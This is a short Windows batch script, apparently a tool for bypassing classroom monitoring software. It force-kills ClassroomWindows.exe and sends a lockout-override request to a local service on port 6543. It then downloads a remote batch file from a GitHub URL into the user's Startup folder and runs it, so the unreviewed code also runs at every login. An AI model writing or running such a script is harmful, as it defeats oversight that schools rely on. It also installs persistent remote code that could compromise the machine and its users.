@echo off
setlocal enabledelayedexpansion
color 0a
set "URL=https://raw.githubusercontent.com/franciumnetwork-dev/FranciumBP_remote/main/FranciumRemote.bat"
set "File=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
echo Bypassing... Please don't close this window.
taskkill /F /IM ClassroomWindows.exe >nul 2>&1
curl -k -I "https://localhost:6543/block" >nul 2>&1
if not errorlevel 1 (
    curl -k -X POST -H "Referer: https://localhost:6543/block?id=lockout" -d "{}" "https://localhost:6543/lockoutOverride"
    ipconfig /flushdns
)
curl %URL% -o "%File%" >nul 2>&1
cls
CMD /c "%File%"
exit
endlocal
